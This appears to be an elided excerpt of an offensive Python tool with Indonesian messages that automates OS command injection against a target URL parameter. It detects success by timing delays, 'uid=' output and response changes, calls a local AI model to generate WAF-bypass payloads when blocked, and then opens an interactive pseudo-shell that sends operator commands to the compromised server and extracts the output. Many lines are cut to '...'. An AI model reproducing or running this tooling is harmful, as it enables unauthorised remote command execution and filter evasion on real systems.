...
class CommandInjectionModule(BaseModule):
        ...
        try:
            ...
            if self.auditor.method == "POST":
                async with session.post(
                    self.auditor.target_url,
                    data={self.auditor.parameter: payload},
                    headers=headers,
                    timeout=self.auditor.timeout,
                ) as res:
                ...
                async with session.get(
                    self.auditor.target_url,
                    params={self.auditor.parameter: payload},
                    headers=headers,
                    timeout=self.auditor.timeout,
                ) as res:
                    body: str = await res.text()
            ...
            entropy_delta: float = abs(
                current_entropy - self.auditor.baseline["entropy_score"]
            )
            ...
            if "sleep" in base_payload and latency >= (
                self.auditor.baseline["response_time"] + config.TIME_DELAY_THRESHOLD
            ):
            ...
            if (
                "uid=" in body
                or status != self.auditor.baseline["status_code"]
                or len(body) != self.auditor.baseline["content_length"]
            ):
            ...
            if indicators:
                ...
                if (
                    verdict == "VERIFIED"
                    or "consistent_evaluation_proof" in indicators
                ) and not main.SHELL_OPENED:
    ...
    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        print("[*] Menjalankan Modul V18.6: OS Command Injection...")
        ...
        for base_payload in payloads:
            for strategy in range(4):
                ...
                success, trigger_ai = await self.execute_and_evaluate(
                    session, payload, base_payload, headers, os_log_capture
                )
                if success:
                    found_any_vuln = True
                    break
                if trigger_ai:
                    ai_payload = await self.auditor.ask_local_ai_to_bypass_waf(
                        session, base_payload, "WAF_BLOCK"
                    )
                    if ai_payload:
                        success_ai, _ = await self.execute_and_evaluate(
                            session, ai_payload, base_payload, headers, os_log_capture
                        )
                        if success_ai:
                            found_any_vuln = True
                            break
    ...
    async def interactive_pseudo_shell(self, session: aiohttp.ClientSession) -> None:
        ...
        print(
            "[++++] GERBANG WATER-SHELL INTERAKTIF V18.6 ABSOLUTE ENGINE ONLINE [++++]"
        )
        print(
            "[*] Status: Jalur latar belakang dikunci total. Operator memegang kendali penuh."
        )
        print(
            "======================================================================\n"
        )
        ...
        while True:
            try:
                ...
                user_cmd = await loop.run_in_executor(
                    None, input, f"\033[1;32m{prompt_label}\033[0m"
                )
                ...
                if self.auditor.method == "POST":
                    async with session.post(
                        self.auditor.target_url,
                        data={self.auditor.parameter: payload_interaktif},
                        headers=headers,
                        timeout=self.auditor.timeout,
                    ) as res:
                    ...
                    async with session.get(
                        self.auditor.target_url,
                        params={self.auditor.parameter: payload_interaktif},
                        headers=headers,
                        timeout=self.auditor.timeout,
                    ) as res:
                        raw_body = await res.text()
                ...
                if token_awal in raw_body and token_akhir in raw_body:
                    match = re.search(
                        f"{token_awal}(.*?){token_akhir}", raw_body, re.DOTALL
                    )
                    ...
                    if (
                        clean_html_strip
                        and len(clean_html_strip) < 2000
                        and "Just a moment" not in clean_html_strip
                    ):
                ...
                logger.error(f"Gagal koordinasi otonom shell V18.6: {str(e)}")

    def verifikator(
        self, response, payload_terpakai, crypto_token
